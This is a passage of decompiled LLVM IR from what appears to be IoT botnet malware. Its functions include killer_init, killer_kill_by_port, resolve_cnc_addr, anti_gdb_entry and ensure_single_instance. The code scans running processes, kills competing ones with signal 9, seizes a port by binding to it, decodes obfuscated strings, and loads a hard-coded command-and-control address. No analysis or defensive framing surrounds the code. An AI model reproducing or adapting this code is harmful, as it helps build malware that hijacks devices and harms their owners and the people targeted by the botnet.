  %v2_e2d4 = inttoptr i32 %v0_e2c8 to i32*
  %v3_e2d4 = call i32 @table_retrieve_val(i32 8, i32* %v2_e2d4)
  %v0_e2dc = load i32, i32* @r4, align 4
  %v1_e2dc = load i32, i32* @sl, align 4
  %v2_e2dc = add i32 %v1_e2dc, %v0_e2dc
  store i32 %v2_e2dc, i32* @r0, align 4
  %v2_e2e0 = inttoptr i32 %v2_e2dc to i8*
  %v3_e2e0 = call i32 @util_strcpy(i8* %v2_e2e0, i32 %v3_e2d4)
  %v2_e2e8 = call i32 @util_strlen(i8* %v3_df30)
  %v1_e2f0 = load i32, i32* @sl, align 4
  %v2_e2f0 = add i32 %v1_e2f0, %v2_e2e8
  store i32 %v2_e2f0, i32* @r0, align 4
  %v2_e2f4 = inttoptr i32 %v2_e2f0 to i8*
  %v3_e2f4 = call i32 @util_strcpy(i8* %v2_e2f4, i32 ptrtoint (i32* @global_var_1b3bc.58 to i32))
  %v2_e2fc = call i32 @util_strlen(i8* %v3_df30)
  %v0_e300 = load i32, i32* @r6, align 4
  %v1_e300 = add i32 %v0_e300, 11
  %v1_e304 = load i32, i32* @sl, align 4
  %v2_e304 = add i32 %v1_e304, %v2_e2fc
  store i32 %v2_e304, i32* @r0, align 4
  %v2_e308 = inttoptr i32 %v2_e304 to i8*
  %v3_e308 = call i32 @util_strcpy(i8* %v2_e308, i32 %v1_e300)
  %v3_e318 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e31c = icmp eq i32 %v3_e318, -1
  br i1 %v7_e31c, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e290
  %v2_e328 = call i32 @util_strlen(i8* %v3_df1c)
  store i32 %v2_e328, i32* @r1, align 4
  %v4_e33c = call i32 @util_stristr(i8* %v3_df1c, i32 %v2_e328, i32 %v2_e148.pre-phi)
  %v7_e340 = icmp eq i32 %v4_e33c, -1
  br i1 %v7_e340, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e328
  %v0_e348 = load i32, i32* @r7, align 4
  %v2_e350 = inttoptr i32 %v0_e348 to i8*
  %v3_e350 = call i32 @util_atoi(i8* %v2_e350, i32 10)
  %v2_e358 = call i32 @kill(i32 %v3_e350, i32 9)
  %v0_e35c = load i32, i32* @r8, align 4
  %v1_e360 = inttoptr i32 %v0_e35c to i32*
  %v2_e360 = call i32 @__GI_readdir(i32* %v1_e360)
  store i32 %v2_e360, i32* @r6, align 4
  %v2_e364 = icmp eq i32 %v2_e360, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e364, label %dec_label_pc_e378, label %dec_label_pc_e288

dec_label_pc_e378:                                ; preds = %dec_label_pc_e270.loopexit, %dec_label_pc_e350, %dec_label_pc_e288, %dec_label_pc_e270.preheader
  %v0_e378 = load i32, i32* @r8, align 4
  %v1_e37c = inttoptr i32 %v0_e378 to i32*
  %v2_e37c = call i32 @__GI_closedir(i32* %v1_e37c)
  %v0_e380 = load i32, i32* @sb, align 4
  %v1_e384 = inttoptr i32 %v0_e380 to i32*
  %v2_e384 = call i32 @__GI_readdir(i32* %v1_e384)
  %v2_e388 = icmp eq i32 %v2_e384, 0
  br i1 %v2_e388, label %dec_label_pc_e390, label %dec_label_pc_e18c

dec_label_pc_e390:                                ; preds = %dec_label_pc_e17c.loopexit, %dec_label_pc_e378, %dec_label_pc_e18c, %dec_label_pc_e17c.preheader
  %v0_e390 = load i32, i32* @sb, align 4
  %v1_e394 = inttoptr i32 %v0_e390 to i32*
  %v2_e394 = call i32 @__GI_closedir(i32* %v1_e394)
  %v0_e398 = load i32, i32* @r5, align 4
  %v1_e398 = urem i32 %v0_e398, 256
  br label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e390
  %storemerge = phi i32 [ %v1_e398, %dec_label_pc_e390 ], [ 0, %dec_label_pc_e15c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e3a0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e13c, %dec_label_pc_e39c
  %v1_e3a8 = call i32 @table_lock_val(i32 6)
  %v1_e3b0 = call i32 @table_lock_val(i32 7)
  %v1_e3b8 = call i32 @table_lock_val(i32 8)
  %v1_e3c0 = call i32 @table_lock_val(i32 9)
  %v0_e3c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_e3c4:                                ; preds = %bb, %dec_label_pc_e3a8
  %v0_e3c4 = phi i32 [ %v1_df9c, %bb ], [ %v0_e3c4.pre, %dec_label_pc_e3a8 ]
  store i32 %v3_deb4, i32* @r4, align 4
  store i32 %v6_deb4, i32* @r5, align 4
  store i32 %v9_deb4, i32* @r6, align 4
  store i32 %v12_deb4, i32* @r7, align 4
  store i32 %v15_deb4, i32* @r8, align 4
  store i32 %v18_deb4, i32* @sb, align 4
  store i32 %v21_deb4, i32* @sl, align 4
  store i32 %v24_deb4, i32* @fp, align 4
  store i32 %v27_deb4, i32* @lr, align 4
  ret i32 %v0_e3c4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e0ac
  %v1_e3d8 = add i32 %v0_e3d8, 1
  %v7_e3dc = icmp eq i32 %v0_e3d8, 0
  br i1 %v7_e3dc, label %dec_label_pc_e3e4, label %dec_label_pc_e0b4

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3d8
  %v1_e3e4 = add i32 %v0_e0bc, 3
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i8*
  %v3_e3e4 = load i8, i8* %v2_e3e4, align 1
  %v7_e3e8 = icmp eq i8 %v3_e3e4, 65
  br i1 %v7_e3e8, label %dec_label_pc_e3fc, label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3e4, %dec_label_pc_e3fc
  %v0_e0c483 = phi i32 [ %v0_e0c484, %dec_label_pc_e3e4 ], [ 1, %dec_label_pc_e3fc ]
  br label %dec_label_pc_e08c.backedge

dec_label_pc_e08c.backedge:                       ; preds = %dec_label_pc_e3f0, %dec_label_pc_e0b8
  %v0_e0c482 = phi i32 [ %v0_e0c483, %dec_label_pc_e3f0 ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v0_e3d874 = phi i32 [ %v1_e3d8, %dec_label_pc_e3f0 ], [ %v0_e0b8, %dec_label_pc_e0b8 ]
  %v0_e0ac.pr71 = phi i32 [ 0, %dec_label_pc_e3f0 ], [ %v0_e0ac.pr72, %dec_label_pc_e0b8 ]
  %v0_e08c = add i32 %v0_e0bc, 1
  %v1_e08c = add i32 %v0_e0bc, 3
  %v2_e08c = inttoptr i32 %v1_e08c to i8*
  %v3_e08c = load i8, i8* %v2_e08c, align 1
  %v4_e08c = zext i8 %v3_e08c to i32
  store i32 %v4_e08c, i32* @r3, align 4
  %v2_e090 = icmp eq i8 %v3_e08c, 0
  %v1_e094 = add i32 %v0_e09479, 1
  br i1 %v2_e090, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3e4
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e404:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_df60

; uselistorder directives
  uselistorder i32 %v1_e094, { 1, 0 }
  uselistorder i32 %v4_e08c, { 1, 0 }
  uselistorder i32 %v0_e0c482, { 1, 0 }
  uselistorder i32 %v1_e3d8, { 1, 0 }
  uselistorder i32 %v2_e384, { 1, 0 }
  uselistorder i32 %v1_e0f0, { 1, 0 }
  uselistorder i32 %v0_e0fc30, { 1, 0 }
  uselistorder i32 %v1_e114, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e0b8, { 1, 0 }
  uselistorder i32 %v0_e09479, { 1, 0 }
  uselistorder i32 %v0_e3d8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e0c484, { 1, 2, 0 }
  uselistorder i32 %v1_e09455, { 1, 0 }
  uselistorder i32 %v2_e078, { 1, 0 }
  uselistorder i32 %v1_e074, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_e034, { 0, 2, 1 }
  uselistorder i32 %v0_e03416, { 1, 0 }
  uselistorder i32 %v1_e000, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_df90, { 1, 2, 0 }
  uselistorder i32 %v0_df38, { 1, 0 }
  uselistorder i32 %v2_df34, { 1, 0, 2 }
  uselistorder i8* %v3_df1c, { 1, 0, 2 }
  uselistorder i32 %v2_defc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @util_stristr, { 0, 1, 2, 15, 16, 17, 18, 19, 20, 21, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e3c4, { 1, 0 }
  uselistorder label %dec_label_pc_e3a8, { 1, 0 }
  uselistorder label %dec_label_pc_e39c, { 1, 0 }
  uselistorder label %dec_label_pc_e390, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e378, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e288, { 1, 0 }
  uselistorder label %dec_label_pc_e288thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e270.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e18c, { 1, 0 }
  uselistorder label %dec_label_pc_e18c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e17c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e110, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e09c, { 1, 0 }
  uselistorder label %dec_label_pc_e040, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_dfa4.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dff4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_df60, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v3_e430 = load i32, i32* @r4, align 4
  %v6_e430 = load i32, i32* @r5, align 4
  %v9_e430 = load i32, i32* @r6, align 4
  %v12_e430 = load i32, i32* @r7, align 4
  %v15_e430 = load i32, i32* @r8, align 4
  %v18_e430 = load i32, i32* @sb, align 4
  %v21_e430 = load i32, i32* @sl, align 4
  %v24_e430 = load i32, i32* @fp, align 4
  %v2_e43c = call i32 @__GI_time(i32* null)
  store i32 %v2_e43c, i32* @r5, align 4
  %v0_e444 = call i32 @__libc_fork()
  %v7_e448 = icmp eq i32 %v0_e444, -1
  %. = zext i1 %v7_e448 to i32
  %tmp69 = icmp slt i32 %v0_e444, 1
  %storemerge50 = select i1 %tmp69, i32 %., i32 1
  store i32 %storemerge50, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2469c.101 to i32), i32* %r3.global-to-local, align 4
  %v2_e464 = icmp eq i32 %storemerge50, 0
  store i32 %v0_e444, i32* @global_var_2469c.101, align 4
  br i1 %v2_e464, label %dec_label_pc_e47c, label %dec_label_pc_e470

dec_label_pc_e470:                                ; preds = %dec_label_pc_e4cc, %entry
  %v1_e478 = phi i32 [ %v0_e444, %entry ], [ 0, %dec_label_pc_e4cc ]
  store i32 %v3_e430, i32* @r4, align 4
  store i32 %v6_e430, i32* @r5, align 4
  store i32 %v9_e430, i32* @r6, align 4
  store i32 %v12_e430, i32* @r7, align 4
  store i32 %v15_e430, i32* @r8, align 4
  store i32 %v18_e430, i32* @sb, align 4
  store i32 %v21_e430, i32* @sl, align 4
  store i32 %v24_e430, i32* @fp, align 4
  ret i32 %v1_e478

dec_label_pc_e47c:                                ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v1_e490 = call i32 @killer_kill_by_port(i32 20736)
  %v2_e494 = icmp eq i32 %v1_e490, 0
  br i1 %v2_e494, label %dec_label_pc_e49c, label %dec_label_pc_e6f8

dec_label_pc_e49c:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e6f8, %dec_label_pc_e720
  %v1_e4a0 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e4a8 = call i32 @malloc()
  %v1_e4a8 = inttoptr i32 %v0_e4a8 to i8*
  store i32 %v0_e4a8, i32* @global_var_271bc.105, align 4
  store i32 ptrtoint (i32* @global_var_246a0.107 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e4a8, align 1
  %v0_e4c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e4c0 = inttoptr i32 %v1_e4c0 to i32*
  store i32 %v0_e4c0, i32* %v2_e4c0, align 4
  %v0_e4c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e4c4, i32* @fp, align 4
  store i32 400, i32* @r6, align 4
  %v2_e5c0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_e5cc = bitcast i32* %stack_var_-120 to i8*
  %v2_e62c = ptrtoint i32* %stack_var_-632 to i32
  br label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e49c
  %v1_e4d0 = call i32 @table_unlock_val(i32 6)
  %v3_e4dc = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e4e0 = call i32 @__GI_opendir(i32 %v3_e4dc)
  store i32 %v1_e4e0, i32* @sl, align 4
  %v2_e4e4 = icmp eq i32 %v1_e4e0, 0
  br i1 %v2_e4e4, label %dec_label_pc_e470, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4cc
  %v1_e4f0 = call i32 @table_lock_val(i32 6)
  %v0_e4f431 = load i32, i32* @sl, align 4
  %v1_e4f832 = inttoptr i32 %v0_e4f431 to i32*
  %v2_e4f833 = call i32 @__GI_readdir(i32* %v1_e4f832)
  %v2_e4fc35 = icmp eq i32 %v2_e4f833, 0
  br i1 %v2_e4fc35, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e504.preheader:                      ; preds = %dec_label_pc_e4ec, %dec_label_pc_e4f4.backedge
  %v0_e50440 = phi i32 [ %v2_e4f8, %dec_label_pc_e4f4.backedge ], [ %v2_e4f833, %dec_label_pc_e4ec ]
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e504.preheader, %dec_label_pc_e574
  %v0_e514 = phi i32 [ %v0_e50440, %dec_label_pc_e504.preheader ], [ %v2_e580, %dec_label_pc_e574 ]
  %v1_e504 = add i32 %v0_e514, 11
  %v2_e504 = inttoptr i32 %v1_e504 to i8*
  %v3_e504 = load i8, i8* %v2_e504, align 1
  %v4_e504 = zext i8 %v3_e504 to i32
  %v1_e508 = add nsw i32 %v4_e504, -48
  store i32 %v1_e508, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e508, 9
  br i1 %tmp, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %dec_label_pc_e504
  store i32 %v1_e504, i32* @r4, align 4
  %v3_e520 = call i32 @util_atoi(i8* %v2_e504, i32 10)
  %v0_e524 = load i32, i32* @r6, align 4
  store i32 %v3_e520, i32* @r8, align 4
  %v0_e52c = load i32, i32* @fp, align 4
  %v1_e52c = add i32 %v0_e52c, 1
  store i32 %v1_e52c, i32* @fp, align 4
  %v5_e530 = icmp slt i32 %v0_e524, %v3_e520
  %v2_e59c = call i32 @__GI_time(i32* null)
  br i1 %v5_e530, label %dec_label_pc_e598, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e514
  %v0_e53c = load i32, i32* @r5, align 4
  %v2_e53c = sub i32 %v2_e59c, %v0_e53c
  %v7_e544 = icmp slt i32 %v2_e53c, 601
  br i1 %v7_e544, label %dec_label_pc_e54c, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e534
  store i32 400, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e534
  %v0_e54c = load i32, i32* @r8, align 4
  %v7_e550 = icmp slt i32 %v0_e54c, 401
  br i1 %v7_e550, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e54c
  %v2_e558 = load i32, i32* @fp, align 4
  %v3_e558 = zext i32 %v2_e558 to i64
  %v4_e558 = mul nuw i64 %v3_e558, 3435973837
  %v3_e55c1 = udiv i64 %v4_e558, 34359738368
  %v3_e5603 = mul nuw nsw i64 %v3_e55c1, 8
  %v3_e560 = trunc i64 %v3_e5603 to i32
  store i32 %v3_e560, i32* %r3.global-to-local, align 4
  %v2_e5645 = mul nuw nsw i64 %v3_e55c1, 2
  %v2_e564 = trunc i64 %v2_e5645 to i32
  %v2_e568 = add i32 %v3_e560, %v2_e564
  store i32 %v2_e568, i32* %r2.global-to-local, align 4
  %v9_e56c = icmp eq i32 %v2_e558, %v2_e568
  br i1 %v9_e56c, label %dec_label_pc_e574, label %dec_label_pc_e4f4.backedge

dec_label_pc_e574:                                ; preds = %dec_label_pc_e554
  %v1_e578 = call i32 @sleep(i32 1)
  %v0_e57c = load i32, i32* @sl, align 4
  %v1_e580 = inttoptr i32 %v0_e57c to i32*
  %v2_e580 = call i32 @__GI_readdir(i32* %v1_e580)
  %v2_e584 = icmp eq i32 %v2_e580, 0
  br i1 %v2_e584, label %dec_label_pc_e58c, label %dec_label_pc_e504

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e4f4.backedge, %dec_label_pc_e574, %dec_label_pc_e4ec
  %v0_e58c = load i32, i32* @sl, align 4
  %v1_e590 = inttoptr i32 %v0_e58c to i32*
  %v2_e590 = call i32 @__GI_closedir(i32* %v1_e590)
  br label %dec_label_pc_e4cc

dec_label_pc_e598:                                ; preds = %dec_label_pc_e514
  %v1_e5a8 = call i32 @table_unlock_val(i32 6)
  %v1_e5b0 = call i32 @table_unlock_val(i32 10)
  %v3_e5bc = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_e5c0, i32* @sb, align 4
  store i32 %v2_e5c0, i32* @r0, align 4
  %v3_e5cc = call i32 @util_strcpy(i8* %v2_e5cc, i32 %v3_e5bc)
  %v1_e5d0 = load i32, i32* @sb, align 4
  %v2_e5d0 = add i32 %v1_e5d0, %v3_e5cc
  store i32 %v2_e5d0, i32* @r5, align 4
  %v0_e5d4 = load i32, i32* @r4, align 4
  store i32 %v2_e5d0, i32* @r0, align 4
  %v2_e5dc = inttoptr i32 %v2_e5d0 to i8*
  %v3_e5dc = call i32 @util_strcpy(i8* %v2_e5dc, i32 %v0_e5d4)
  store i32 %v3_e5dc, i32* @r4, align 4
  %v3_e5ec = call i32 @table_retrieve_val(i32 10, i32* null)
  %v0_e5f4 = load i32, i32* @r4, align 4
  %v1_e5f4 = load i32, i32* @r5, align 4
  %v2_e5f4 = add i32 %v1_e5f4, %v0_e5f4
  store i32 %v2_e5f4, i32* @r0, align 4
  %v2_e5f8 = inttoptr i32 %v2_e5f4 to i8*
  %v3_e5f8 = call i32 @util_strcpy(i8* %v2_e5f8, i32 %v3_e5ec)
  %v1_e600 = call i32 @table_lock_val(i32 6)
  %v1_e608 = call i32 @table_lock_val(i32 10)
  %v3_e614 = call i32 @__libc_open(i32 %v2_e5c0, i64* null)
  %v7_e618 = icmp eq i32 %v3_e614, -1
  store i32 %v3_e614, i32* @r7, align 4
  br i1 %v7_e618, label %dec_label_pc_e6c4, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e598
  %v1_e628 = call i32 @table_unlock_val(i32 62)
  store i32 %v2_e62c, i32* @r6, align 4
  %v0_e63027 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c28 = call i32 @__libc_read(i32 %v0_e63027)
  store i32 %v1_e63c28, i32* @r4, align 4
  %tmp72 = icmp slt i32 %v1_e63c28, 1
  br i1 %tmp72, label %dec_label_pc_e6e4, label %dec_label_pc_e648

dec_label_pc_e648:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e630.backedge
  %v3_e650 = call i32 @table_retrieve_val(i32 62, i32* null)
  store i32 %v3_e650, i32* @r5, align 4
  %v3_e660 = call i32 @table_retrieve_val(i32 62, i32* null)
  %v1_e664 = inttoptr i32 %v3_e660 to i8*
  %v2_e664 = call i32 @util_strlen(i8* %v1_e664)
  %v0_e668 = load i32, i32* @r4, align 4
  %v5_e66c = icmp slt i32 %v0_e668, %v2_e664
  br i1 %v5_e66c, label %dec_label_pc_e630.backedge, label %.thread12

dec_label_pc_e630.backedge:                       ; preds = %dec_label_pc_e694, %.thread12, %dec_label_pc_e648
  %v0_e630 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c = call i32 @__libc_read(i32 %v0_e630)
  store i32 %v1_e63c, i32* @r4, align 4
  %tmp73 = icmp slt i32 %v1_e63c, 1
  br i1 %tmp73, label %dec_label_pc_e6e4, label %dec_label_pc_e648

.thread12:                                        ; preds = %dec_label_pc_e648
  %v1_e67819 = add i32 %v0_e668, -1
  store i32 %v1_e67819, i32* @r4, align 4
  %v2_e67820 = icmp eq i32 %v0_e668, 0
  br i1 %v2_e67820, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680.lr.ph

dec_label_pc_e680.lr.ph:                          ; preds = %.thread12
  %v0_e680.pre = load i32, i32* @r5, align 4
  %v1_e684.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e694, %dec_label_pc_e680.lr.ph
  %v0_e678 = phi i32 [ %v1_e67819, %dec_label_pc_e680.lr.ph ], [ %v1_e678, %dec_label_pc_e694 ]
  %v0_e694 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e694, %dec_label_pc_e694 ]
  %v1_e680 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e68043, %dec_label_pc_e694 ]
  %v2_e680 = add i32 %v1_e680, %v0_e680.pre
  %v3_e680 = inttoptr i32 %v2_e680 to i8*
  %v4_e680 = load i8, i8* %v3_e680, align 1
  %v6_e680 = zext i8 %v4_e680 to i32
  store i32 %v6_e680, i32* %r2.global-to-local, align 4
  %v2_e684 = add i32 %v0_e694, %v1_e684.pre
  %v3_e684 = inttoptr i32 %v2_e684 to i8*
  %v4_e684 = load i8, i8* %v3_e684, align 1
  %v6_e684 = zext i8 %v4_e684 to i32
  store i32 %v6_e684, i32* @r3, align 4
  %v9_e688 = icmp eq i8 %v4_e684, %v4_e680
  br i1 %v9_e688, label %dec_label_pc_e69c, label %bb74

bb74:                                             ; preds = %dec_label_pc_e680
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %bb74, %dec_label_pc_e69c
  %v1_e68043 = phi i32 [ %v1_e69c, %dec_label_pc_e69c ], [ 0, %bb74 ]
  %v1_e694 = add i32 %v0_e694, 1
  %v1_e678 = add i32 %v0_e678, -1
  store i32 %v1_e678, i32* @r4, align 4
  %v2_e678 = icmp eq i32 %v0_e678, 0
  br i1 %v2_e678, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e680
  %v1_e69c = add i32 %v1_e680, 1
  %v9_e6a0 = icmp eq i32 %v2_e664, %v1_e69c
  br i1 %v9_e6a0, label %dec_label_pc_e6a8, label %dec_label_pc_e694

dec_label_pc_e6a8:                                ; preds = %dec_label_pc_e69c
  %v1_e6ac = call i32 @table_lock_val(i32 62)
  %v0_e6b0 = load i32, i32* @r7, align 4
  %v1_e6b4 = call i32 @__GI___libc_close(i32 %v0_e6b0)
  %v0_e6b8 = load i32, i32* @r8, align 4
  %v2_e6c0 = call i32 @kill(i32 %v0_e6b8, i32 9)
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e598, %dec_label_pc_e6e4, %dec_label_pc_e6a8
  %v2_e6cc = call i32 @util_zero(i32 %v2_e5c0, i32 64)
  %v1_e6d4 = call i32 @sleep(i32 1)
  store i32 %v2_e59c, i32* @r5, align 4
  %v0_e6dc = load i32, i32* @r8, align 4
  store i32 %v0_e6dc, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e4f4.backedge:                       ; preds = %dec_label_pc_e554, %dec_label_pc_e54c, %dec_label_pc_e504, %dec_label_pc_e6c4, %.thread7
  %v0_e4f4 = load i32, i32* @sl, align 4
  %v1_e4f8 = inttoptr i32 %v0_e4f4 to i32*
  %v2_e4f8 = call i32 @__GI_readdir(i32* %v1_e4f8)
  %v2_e4fc = icmp eq i32 %v2_e4f8, 0
  br i1 %v2_e4fc, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e630.backedge, %dec_label_pc_e624
  %v1_e6e8 = call i32 @table_lock_val(i32 62)
  %v0_e6ec = load i32, i32* @r7, align 4
  %v1_e6f0 = call i32 @__GI___libc_close(i32 %v0_e6ec)
  br label %dec_label_pc_e6c4

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e47c
  %v2_e480 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_e480, i32* %r3.global-to-local, align 4
  %v0_e700 = load i32, i32* @r4, align 4
  store i32 %v0_e700, i32* %r2.global-to-local, align 4
  %v3_e710 = call i32 @socket(i32 2, i32 1, i32 %v0_e700)
  %v7_e714 = icmp eq i32 %v3_e710, -1
  store i32 %v3_e710, i32* @r4, align 4
  br i1 %v7_e714, label %dec_label_pc_e49c, label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e6f8
  %v2_e720 = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e728 = call i32 @bind(i32 %v3_e710, i32 %v2_e720, i32 16)
  %v0_e72c = load i32, i32* @r4, align 4
  %v2_e734 = call i32 @listen(i32 %v0_e72c, i32 1)
  br label %dec_label_pc_e49c

; uselistorder directives
  uselistorder i32 %v3_e710, { 2, 1, 0 }
  uselistorder i32 %v2_e4f8, { 1, 0 }
  uselistorder i32 %v1_e69c, { 1, 0 }
  uselistorder i32 %v1_e678, { 1, 0 }
  uselistorder i32 %v1_e680, { 1, 0 }
  uselistorder i32 %v0_e694, { 1, 0 }
  uselistorder i32 %v0_e678, { 1, 0 }
  uselistorder i32 %v0_e668, { 1, 0, 2 }
  uselistorder i32 %v2_e664, { 1, 0 }
  uselistorder i32 %v3_e614, { 1, 0 }
  uselistorder i32 %v2_e580, { 1, 0 }
  uselistorder i32 %v2_e62c, { 1, 0, 2 }
  uselistorder i32 %storemerge50, { 1, 0 }
  uselistorder i32 %v0_e444, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_atoi, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32* @global_var_2469c.101, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e4f4.backedge, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_e6c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e694, { 1, 0 }
  uselistorder label %dec_label_pc_e648, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0 }
  uselistorder label %dec_label_pc_e504.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e49c, { 2, 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_e764.110 to i32), i32* @global_var_24528.112, align 4
  ret i32 %arg1
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_e76c = call i32 @table_unlock_val(i32 2)
  store i32 ptrtoint (i16** @global_var_271c0.114 to i32), i32* @r4, align 4
  store i32 1042130361, i32* @global_var_271c4.116, align 4
  %v3_e784 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v4_e784 = inttoptr i32 %v3_e784 to i16*
  %v3_e788 = load i16, i16* %v4_e784, align 2
  store i16 %v3_e788, i16* bitcast (i32* @global_var_271c2.117 to i16*), align 4
  %v1_e794 = call i32 @table_lock_val(i32 2)
  ret i32 %v1_e794
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_e7a8 = load i32, i32* @r6, align 4
  %v12_e7a8 = load i32, i32* @r7, align 4
